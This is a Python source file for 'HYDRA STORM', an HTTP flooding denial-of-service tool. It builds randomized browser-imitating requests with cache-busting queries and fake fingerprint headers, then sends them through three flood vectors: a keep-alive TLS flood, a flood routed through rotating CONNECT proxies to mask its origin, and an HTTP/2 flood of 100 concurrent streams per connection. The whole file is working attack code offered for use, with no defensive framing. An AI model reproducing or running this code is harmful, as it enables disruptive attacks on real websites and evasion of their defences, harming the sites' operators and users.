"""
HYDRA STORM v1.0 — HTTP Flood Vectors
Keep-alive reuse, proxy tunnel, HTTP/2 multiplex.
"""

import socket
import ssl
import random
import string
import threading
import time
import struct
from typing import List, Optional, Dict, Any

# ─── Optional h2 for HTTP/2 ───
try:
    import h2.connection  # type: ignore
    import h2.config      # type: ignore
    import h2.events       # type: ignore
    H2_AVAILABLE = True
except ImportError:
    H2_AVAILABLE = False


# ─── Browser-grade User-Agents ───
USER_AGENTS: List[str] = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.71 Mobile Safari/537.36",
]

# ─── Realistic URL paths ───
PATHS: List[str] = [
    "/", "/index.html", "/about", "/contact", "/search",
    "/api/v1/status", "/api/v2/health", "/api/v1/users",
    "/feed", "/sitemap.xml", "/robots.txt", "/favicon.ico",
    "/login", "/register", "/dashboard", "/profile",
    "/assets/app.js", "/assets/main.css", "/assets/vendor.js",
    "/images/logo.png", "/images/hero.webp",
    "/blog", "/blog/latest", "/news", "/pricing",
    "/docs", "/docs/api", "/help", "/terms", "/privacy",
    "/checkout", "/cart", "/products", "/categories",
]

ACCEPT_TYPES: List[str] = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "application/json, text/plain, */*",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
]

ACCEPT_LANG: List[str] = [
    "en-US,en;q=0.9",
    "en-GB,en;q=0.9",
    "en-US,en;q=0.5",
    "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7",
    "de-DE,de;q=0.9,en;q=0.8",
    "es-ES,es;q=0.9,en;q=0.8",
]

ENCODINGS: List[str] = [
    "gzip, deflate, br",
    "gzip, deflate, br, zstd",
    "gzip, deflate",
]

REFERERS: List[str] = [
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://duckduckgo.com/",
    "https://www.google.com/search?q=",
    "https://t.co/",
    "https://www.reddit.com/",
    "https://news.ycombinator.com/",
    "",  # no referer sometimes — realistic
]

SEC_CH_UA_VARIANTS: List[str] = [
    '"Chromium";v="126", "Google Chrome";v="126", "Not-A.Brand";v="8"',
    '"Chromium";v="125", "Google Chrome";v="125", "Not-A.Brand";v="24"',
    '"Not/A)Brand";v="8", "Chromium";v="126", "Microsoft Edge";v="126"',
    '"Firefox";v="127"',
]


def _random_query() -> str:
    """Generate a random query string to bust caches."""
    k = "".join(random.choices(string.ascii_lowercase, k=random.randint(2, 6)))
    v = "".join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(4, 12)))
    extra = ""
    if random.random() > 0.5:
        k2 = "".join(random.choices(string.ascii_lowercase, k=random.randint(2, 5)))
        v2 = "".join(random.choices(string.digits, k=random.randint(1, 8)))
        extra = f"&{k2}={v2}"
    return f"?{k}={v}{extra}"


def build_request_pool(domain: str, cookies: Optional[Dict[str, str]] = None, count: int = 300) -> List[bytes]:
    """
    Pre-build a pool of randomized HTTP/1.1 GET requests.
    Each request has unique path, UA, headers, cache-buster query string.
    Returns list of raw bytes ready to shove down a socket.
    """
    pool: List[bytes] = []
    cookie_header = ""
    if cookies:
        cookie_header = "Cookie: " + "; ".join(f"{k}={v}" for k, v in cookies.items()) + "\r\n"

    for _ in range(count):
        path = random.choice(PATHS) + _random_query()
        ua = random.choice(USER_AGENTS)
        accept = random.choice(ACCEPT_TYPES)
        lang = random.choice(ACCEPT_LANG)
        enc = random.choice(ENCODINGS)
        ref = random.choice(REFERERS)
        sec_ch = random.choice(SEC_CH_UA_VARIANTS)

        headers = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {domain}\r\n"
            f"User-Agent: {ua}\r\n"
            f"Accept: {accept}\r\n"
            f"Accept-Language: {lang}\r\n"
            f"Accept-Encoding: {enc}\r\n"
            f"Connection: keep-alive\r\n"
            f"Upgrade-Insecure-Requests: 1\r\n"
            f"Sec-Fetch-Dest: document\r\n"
            f"Sec-Fetch-Mode: navigate\r\n"
            f"Sec-Fetch-Site: none\r\n"
            f"Sec-Fetch-User: ?1\r\n"
            f"sec-ch-ua: {sec_ch}\r\n"
            f"sec-ch-ua-mobile: ?0\r\n"
            f'sec-ch-ua-platform: "{random.choice(["Windows", "macOS", "Linux"])}"\r\n'
        )
        if ref:
            headers += f"Referer: {ref}\r\n"
        if cookie_header:
            headers += cookie_header

        # Random X-header for fingerprint noise
        x_key = "".join(random.choices(string.ascii_lowercase, k=random.randint(4, 8)))
        x_val = "".join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(8, 20)))
        headers += f"X-{x_key}: {x_val}\r\n"
        headers += "\r\n"
        pool.append(headers.encode())

    return pool


def _make_tls_socket(ip: str, port: int, domain: str, timeout: float = 10.0) -> ssl.SSLSocket:
    """Create a TLS socket with browser-grade ciphers, TCP_NODELAY, fat send buffer."""
    raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    raw.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    raw.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
    raw.settimeout(timeout)
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_ciphers(
        "TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:"
        "ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:"
        "ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384"
    )
    ctx.set_alpn_protocols(["h2", "http/1.1"])
    sock = ctx.wrap_socket(raw, server_hostname=domain)
    sock.connect((ip, port))
    return sock


# ============================================================
#  HTTP Keep-Alive Flood
# ============================================================
class HTTPKeepAliveFlood:
    """
    Reuses a single TLS connection for 80-200 requests before cycling.
    Pre-generated request pool prevents per-send overhead.
    """

    def __init__(
        self,
        target_ip: str,
        domain: str,
        port: int,
        metrics: Any,
        cookies: Optional[Dict[str, str]] = None,
        requests_per_conn: int = 0,  # 0 = random 80-200
    ) -> None:
        self.target_ip = target_ip
        self.domain = domain
        self.port = port
        self.metrics = metrics
        self.cookies = cookies
        self.rpc = requests_per_conn
        self.pool = build_request_pool(domain, cookies)

    def fire(self, stop_event: threading.Event) -> None:
        while not stop_event.is_set():
            sock: Optional[ssl.SSLSocket] = None
            try:
                sock = _make_tls_socket(self.target_ip, self.port, self.domain)
                self.metrics.conn()
                limit = self.rpc if self.rpc > 0 else random.randint(80, 200)

                for _ in range(limit):
                    if stop_event.is_set():
                        break
                    req = random.choice(self.pool)
                    sock.sendall(req)
                    self.metrics.hit(len(req), bp=True)

                    # Drain response — don't care about content
                    try:
                        sock.recv(4096)
                    except (socket.timeout, OSError):
                        pass
            except Exception:
                self.metrics.err()
            finally:
                if sock:
                    try:
                        sock.shutdown(socket.SHUT_RDWR)
                    except OSError:
                        pass
                    try:
                        sock.close()
                    except OSError:
                        pass


# ============================================================
#  HTTP Proxy Flood (CONNECT tunnel)
# ============================================================
class HTTPProxyFlood:
    """
    Same as keep-alive flood but routes through an HTTP CONNECT proxy.
    Rotates proxy every connection cycle.
    """

    def __init__(
        self,
        target_ip: str,
        domain: str,
        port: int,
        metrics: Any,
        proxies: List[str],
        cookies: Optional[Dict[str, str]] = None,
    ) -> None:
        self.target_ip = target_ip
        self.domain = domain
        self.port = port
        self.metrics = metrics
        self.proxies = proxies if proxies else []
        self.cookies = cookies
        self.pool = build_request_pool(domain, cookies)

    def _connect_via_proxy(self, proxy: str) -> ssl.SSLSocket:
        """Establish a CONNECT tunnel through the proxy, then wrap in TLS."""
        phost, pport_str = proxy.split(":")
        pport = int(pport_str)

        raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        raw.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        raw.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
        raw.settimeout(10)
        raw.connect((phost, pport))

        connect_req = (
            f"CONNECT {self.domain}:{self.port} HTTP/1.1\r\n"
            f"Host: {self.domain}:{self.port}\r\n"
            f"Proxy-Connection: keep-alive\r\n"
            f"\r\n"
        ).encode()
        raw.sendall(connect_req)

        resp = raw.recv(4096)
        if b"200" not in resp:
            raw.close()
            raise ConnectionError("Proxy CONNECT rejected")

        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        ctx.set_ciphers(
            "TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:"
            "ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256"
        )
        return ctx.wrap_socket(raw, server_hostname=self.domain)

    def fire(self, stop_event: threading.Event) -> None:
        while not stop_event.is_set():
            if not self.proxies:
                self.metrics.err()
                time.sleep(1)
                continue

            proxy = random.choice(self.proxies)
            sock: Optional[ssl.SSLSocket] = None
            try:
                sock = self._connect_via_proxy(proxy)
                self.metrics.conn()
                limit = random.randint(80, 200)

                for _ in range(limit):
                    if stop_event.is_set():
                        break
                    req = random.choice(self.pool)
                    sock.sendall(req)
                    self.metrics.hit(len(req), bp=True)
                    try:
                        sock.recv(4096)
                    except (socket.timeout, OSError):
                        pass
            except Exception:
                self.metrics.err()
            finally:
                if sock:
                    try:
                        sock.shutdown(socket.SHUT_RDWR)
                    except OSError:
                        pass
                    try:
                        sock.close()
                    except OSError:
                        pass


# ============================================================
#  HTTP/2 Multiplexed Flood
# ============================================================
class HTTP2Flood:
    """
    If h2 is available: opens one TLS connection, fires 100 concurrent
    HTTP/2 streams per connection. Absolute throughput monster.
    Falls back to HTTP/1.1 keep-alive if h2 isn't installed.
    """

    def __init__(
        self,
        target_ip: str,
        domain: str,
        port: int,
        metrics: Any,
        streams_per_conn: int = 100,
        cookies: Optional[Dict[str, str]] = None,
    ) -> None:
        self.target_ip = target_ip
        self.domain = domain
        self.port = port
        self.metrics = metrics
        self.streams = streams_per_conn
        self.cookies = cookies
        self.pool = build_request_pool(domain, cookies)
        # Fallback instance created lazily
        self._fallback: Optional[HTTPKeepAliveFlood] = None

    def _build_h2_headers(self) -> List[tuple]:
        path = random.choice(PATHS) + _random_query()
        ua = random.choice(USER_AGENTS)
        headers = [
            (":method", "GET"),
            (":path", path),
            (":authority", self.domain),
            (":scheme", "https"),
            ("user-agent", ua),
            ("accept", random.choice(ACCEPT_TYPES)),
            ("accept-language", random.choice(ACCEPT_LANG)),
            ("accept-encoding", random.choice(ENCODINGS)),
        ]
        ref = random.choice(REFERERS)
        if ref:
            headers.append(("referer", ref))
        if self.cookies:
            cookie_val = "; ".join(f"{k}={v}" for k, v in self.cookies.items())
            headers.append(("cookie", cookie_val))
        return headers

    def fire(self, stop_event: threading.Event) -> None:
        if not H2_AVAILABLE:
            # Graceful fallback to HTTP/1.1
            if self._fallback is None:
                self._fallback = HTTPKeepAliveFlood(
                    self.target_ip, self.domain, self.port,
                    self.metrics, self.cookies
                )
            self._fallback.fire(stop_event)
            return

        while not stop_event.is_set():
            sock: Optional[ssl.SSLSocket] = None
            try:
                sock = _make_tls_socket(self.target_ip, self.port, self.domain)
                self.metrics.conn()

                config = h2.config.H2Configuration(client_side=True, header_encoding="utf-8")
                conn = h2.connection.H2Connection(config=config)
                conn.initiate_connection()
                sock.sendall(conn.data_to_send())

                # Fire streams in bursts
                for burst in range(3):
                    if stop_event.is_set():
                        break
                    for _ in range(self.streams):
                        if stop_event.is_set():
                            break
                        try:
                            hdrs = self._build_h2_headers()
                            conn.send_headers(conn.get_next_available_stream_id(), hdrs, end_stream=True)
                            data = conn.data_to_send()
                            if data:
                                sock.sendall(data)
                                self.metrics.hit(len(data), bp=True)
                        except Exception:
                            break

                    # Drain anything coming back
                    try:
                        incoming = sock.recv(65536)
                        if incoming:
                            events = conn.receive_data(incoming)
                            resp_data = conn.data_to_send()
                            if resp_data:
                                sock.sendall(resp_data)
                    except (socket.timeout, OSError):
                        pass

            except Exception:
                self.metrics.err()
            finally:
                if sock:
                    try:
                        sock.shutdown(socket.SHUT_RDWR)
                    except OSError:
                        pass
                    try:
                        sock.close()
                    except OSError:
                        pass
